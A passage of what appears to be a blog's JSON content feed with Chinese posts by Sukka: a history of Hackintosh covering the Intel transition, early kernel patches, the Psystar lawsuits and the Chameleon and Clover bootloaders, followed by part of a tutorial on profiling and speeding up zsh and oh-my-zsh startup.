class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 